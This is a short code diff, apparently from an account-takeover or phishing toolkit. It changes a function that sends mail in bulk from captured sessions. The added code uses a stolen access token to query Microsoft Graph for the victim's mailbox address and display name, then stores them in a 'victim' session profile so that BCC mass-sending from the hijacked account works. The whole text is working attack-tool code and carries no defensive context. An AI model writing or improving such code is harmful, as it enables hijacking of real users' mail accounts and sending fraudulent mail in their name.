@@ -21528,6 +21528,21 @@ def b2b_send():
 
     # Resolve sender's own email so we can filter it out of recipients
     sender_email = (s.get('victim_email') or '').strip().lower()
+    # Personal sessions captured with opaque tokens may have no stored profile
+    # (the identity lives only in Graph, not in the token). Resolve it live and
+    # persist it, otherwise the BCC 'to_header=sender' mode has no address and
+    # the self-recipient filter silently fails.
+    if not sender_email:
+        try:
+            _me = graph.make_graph_request('/me?$select=mail,userPrincipalName,displayName', token)
+            if _me and not _me.get('error'):
+                sender_email = (_me.get('mail') or _me.get('userPrincipalName') or '').strip().lower()
+                if sender_email:
+                    db.update_session_profile(uc, _me.get('displayName') or sender_email.split('@')[0],
+                                              sender_email, s.get('victim_role') or 'User')
+                    s['victim_email'] = sender_email
+        except Exception:
+            pass
 
     def generate():
         nonlocal token
